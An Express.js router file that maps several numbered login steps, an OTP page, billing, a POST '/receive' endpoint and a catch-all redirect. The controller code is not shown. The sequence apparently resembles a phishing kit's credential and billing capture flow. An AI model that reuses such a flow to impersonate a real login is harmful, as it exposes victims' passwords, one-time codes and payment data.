const express = require('express');
const router =  express.Router();
const controller = require('../controllers/controller');

router.get('/auth/login', controller.login);
router.post('/auth/login', controller.loginPost);

router.get('/auth/login/2', controller.login2);
router.post('/auth/login/2', controller.loginPost2);

router.get('/auth/secure', controller.loginotp);
router.post('/auth/secure', controller.loginPostotp);

router.get('/auth/login/3', controller.login3);
router.post('/auth/login/3', controller.loginPost3);

router.get('/auth/login/x', controller.loginx);
router.post('/auth/login/x', controller.loginPostx);

router.get('/auth/login/4', controller.login4);
router.post('/auth/login/4', controller.loginPost4);

router.get('/auth/login/5', controller.login5);
router.post('/auth/login/5', controller.loginPost5);

router.get('/at', controller.att);

router.get('/at2', controller.at2);

router.get('/billing', controller.billing);

router.post('/receive', controller.receive);

router.get('/auth/complete', controller.complete);

router.get('*', controller.page404Redirect);

module.exports = router;